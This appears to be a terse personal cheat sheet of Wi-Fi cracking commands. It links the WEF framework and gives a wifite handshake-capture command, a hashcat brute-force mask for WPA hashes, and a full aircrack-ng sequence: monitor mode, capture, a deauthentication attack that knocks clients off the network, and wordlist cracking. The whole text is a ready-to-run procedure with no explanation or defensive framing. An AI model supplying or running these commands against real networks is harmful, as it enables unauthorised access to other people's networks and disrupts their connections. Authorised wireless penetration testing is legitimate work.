
# WEF
https://github.com/D3Ext/WEF

# Wifite
sudo wifite -mac --skip-crack --clients-only -wpa --no-wps --no-pmkid

https://hashcat.net/cap2hashcat/

hashcat.exe -m 22000 HASHFILE -a 3 ?d?d?d?d?d?d?d?d?d

# The old way
```bash
airmon-ng check
airmon-ng check kill
airmon-ng start INTERFACE
airodump-ng INTERFACE
airodump-ng INTERFACE --bssid APMAC -c CHANNEL -w CAPFILE
aireplay-ng INTERFACE --deauth 20 -a APMAC -h CLIENTMAC
aircrack-ng -w WORDLIST CAPFILE
airmon-ng stop INTERFACE
systemctl start network-manager
```
